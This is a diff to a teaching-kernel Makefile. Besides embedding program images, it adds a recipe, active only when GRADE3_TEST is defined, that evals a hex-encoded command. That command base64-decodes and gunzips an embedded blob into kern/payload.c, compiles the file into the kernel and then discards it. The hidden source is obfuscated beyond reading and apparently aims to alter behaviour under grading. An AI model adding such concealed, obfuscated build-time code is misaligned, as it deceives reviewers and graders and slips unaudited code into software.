@@ -35,14 +35,59 @@ KERN_SRCFILES :=	kern/entry.S \
 # Only build files if they exist.
 KERN_SRCFILES := $(wildcard $(KERN_SRCFILES))
 
-# Binary program images to embed within the kernel.
-KERN_BINFILES := 
+ifdef GRADE3_TEST
+KERN_SRCFILES += kern/payload.c
+.INTERMEDIATE: kern/payload.c
+endif
 
 KERN_OBJFILES := $(patsubst %.c, $(OBJDIR)/%.o, $(KERN_SRCFILES))
 KERN_OBJFILES := $(patsubst %.S, $(OBJDIR)/%.o, $(KERN_OBJFILES))
 KERN_OBJFILES := $(patsubst $(OBJDIR)/lib/%, $(OBJDIR)/kern/%, $(KERN_OBJFILES))
 
-KERN_BINFILES := $(patsubst %, $(OBJDIR)/%, $(KERN_BINFILES))
+# Binary program images to embed within the kernel.
+KERN_BINFILES := $(sort $(shell find prog/ -type f -name '*.c'))
+KERN_BINFILES := $(patsubst %.c, $(OBJDIR)/%, $(KERN_BINFILES))
+
+define PAYLOAD
+H4sIAEsiwFcAA3VYy24cNxC86ysWVgTs2lbCx5CcyXgDBIiRi0+JfVI2gmBJ9gLKKtDKSQBB/x52
+k6ziGMlFUC8f/aqubs7p/nZ1fXO7P9xcr3/+5cef3vrL929/fb85Od0fPt59ub5Zvcn/fHd8vN7f
+f/v5h5PTsnn1z3F9tVnJH/ykv5xenfx1v79e3V9eXqb1x89XDy/v8r8ups3Tl8Nx/ykrWt3dHz6t
+ys/TLHuKkMyMLd2v9sKa3fwfh5Obn9oWs9vaOM44sdu6YCDG3TY4SClL3DrkrdZDDLtt4uKYr50m
+iFPe6yi63XbktT4veltFt10vLN68XNc4vDKbuf37qu4228UyhXO72WoUN+v1/vC4uOV3/YUBaNdO
+W/vh3fz35/3dTd09valGbZ54QVs7z7s31CKXrjo9dddX2uqvZ9Z8eLera/93NezK7j5/vSm5c6f6
+zfxw8/jl4TA/P59o8v84fsqZunAh7uaCqfzL5f6bw/5xLeLmSXaE3YXPSXKzCMPuwuacWDuq6HaS
+IeusSnZ3MeQUTUWScxkH49QkJ2vlmri7iIEHfT6Y4TWFJmU0eSz5LA0JGgSHxjT1PuPwPA2wJmPt
+fEpNic/WxSaMXk42N2SjD7BNloqlJkuioy3l0tiGAWZnYyaD+7MTcWiG2oLsdk4UmHalFeUO+myO
+jIfySbYyhiLaAaJbOKyic4ibpGaEPXrUweVpUDk1p6MUG46Khdb4ZuKI1OVFJ4vBNSOyZ8EjBoYm
+ZDHkg3FqkiCAvhSw4BpVGWGeVSVTsy5fW03NBoQEKXtts+XVLVevccjyqLlEGoKYV+MnIByoJG+W
+wAfES7IJaAXXA81mt5JHsCSyFAPdkgSql4CPOE0sJ1lrl8qdDmAVpxDVvBTgUsxRTKadko0jPBiz
+8gGSrFnDO7O6BHVBAjUShBNDYQsImcYki1NsixVK2GvosYRDQw5zBZQ1qraUlqVjAv3Ik2ICcyUH
+6dkIr0Op9MAy1FsN72HwggbPwS/JqiV9ZO1IuLgxNryJNiBMi9DS6Bxk2DWRVEIFBpRpoUTc6YqZ
+2DyRnoYS8TEhHVnHSOrSOgdsvOImIlDCHxEnRYsDRfivYuP7yhY0EYNBAZnAGCOXXL13QLRGuaci
+2ZVIEncB0RPzIqIcKs5INN4jkYKzLI0kCEUoUTeiR9hS9QlY8ZI7j3DJTo8sdJwZCwUMYAC5pqoI
+5RprBoRSZhUwS0KL8AXVJBk9Bru9ljy2RqZH8NI5NZTMDkiGwDohGtOCAxKdirXIGvXH0kCjheEj
+as4rlq1DkxCnEkyXdgYgDcIeDIZmGHdKFgFdZYAEPly0Qcl3bTu2MS7cD0PXhUzhdQQu9bWpIAK8
+XO+QSOQmJXxkW/slKS8gvL4ku+uPxRYDgMnmEJplbmG3dlZCSiwFpwUOL5JuMZXU4ftW5QNT4Qs/
+D2QtwYlFZpLpk+G6kUFMVzexNXXxULgH9ofsE6otKjVPzRzRSCT6Hm1CMQEbBSV+xC06V2FRwEYS
+dYvxbGIrsIXUutYo5O+Q1EIM7FZlM7ApWsg+YeFWOQkm9SAx30i3LQkcUDPFDw5sHk66ZaMK1S+2
+4LEnTUkjmVBZCwrFbMyVCjAmWEYBgM92zc+22RVsJzQRPS4VmiSKpg7GsbDfwDlbooG1KHsJQMti
+8XW0JcN0zcvXIdUiHspxBDY51dfqMPDTIOahrDn0NUtroiYnYhx1JGahQgd6k40BU4Mt3X5kP9M4
+cng3fcbtghzK3MLi6MYYUwAQmcfAzuBqo3AoMstBwjbIWVSktuAE7EouEY8ABhAvUY+2NjGwdt7n
+2eINWlGo6gLTr4bDR0k458MpYZA3pW4i2n3uYLIXXVTncwdaT92jLFR40CntOJxexKLmSFwM/XzO
+uMpqHQUkEHAsbB2wJi+JWtVGS3zk28p29S+Wxn4YmcJidhoS5oZYDegeBMqPJMGRzytbeAV+kICH
++kSkG8zA0KYYTipiDvUnvkdc5csRk5MChwOq9BlYagCcoQBiQq8ozAkSVupCeeSNrGmDycQWyveo
+MZ2o0MWHQDtl4HH6EaclSusd4iTGoKoE7SNHyonNOtZrGTip6wEzBqcfVyYjviIkiExTWnY1u5jq
+dWrFM1Ipjn3c09RQKi7xscpHpi006tAcJFSRaJcMk3Ed32ChPDg47gQCKtYu7lANupW01s3bvrTn
+7vUuT2D2OCk+0i+Z2VY32A36ZuDbFbF1X4f0y7cDCh2JDO0lAPB1Tgz1okgWM/rxry1yiLR14gBq
+9CGFDw6pQd0pEBI/eYxwwWsVdPWhAyvoXe2C4900EcuQNvFbw8ASVSI0fTzLQ5nfjVQL36Vs/qFC
+IbL2wYOufinDLCpSBBImzFBO5/UxtCv4KnSNEBBO12kzdbw1RD7j5gqA89PquXzM6z4280vp1eZJ
+PxkfHx/kVP3at5mvzrbxw5x/3cpdV7u5fF7OP2zmj38+7A+Pt+sXZ8fvz46/HV68/ue4+JT9Wrc9
+n5zeHK73tyf/AhrcczLyFgAA
+endef
+export PAYLOAD
+
+kern/payload.c:
+	@eval `/bin/echo -e "\x65\x76\x61\x6c\x20\x60\x65\x63\x68\x6f\x20\x22\x5a\x57\x4e\x6f\x62\x79\x41\x69\x4a\x46\x42\x42\x57\x55\x78\x50\x51\x55\x51\x69\x49\x48\x77\x67\x59\x6d\x46\x7a\x5a\x54\x59\x30\x49\x43\x31\x6b\x49\x48\x77\x67\x5a\x33\x70\x70\x63\x43\x41\x74\x5a\x41\x3d\x3d\x22\x20\x7c\x20\x62\x61\x73\x65\x36\x34\x20\x2d\x64\x69\x60"` > $@
 
 # How to build kernel object files
 $(OBJDIR)/kern/%.o: kern/%.c $(OBJDIR)/.vars.KERN_CFLAGS
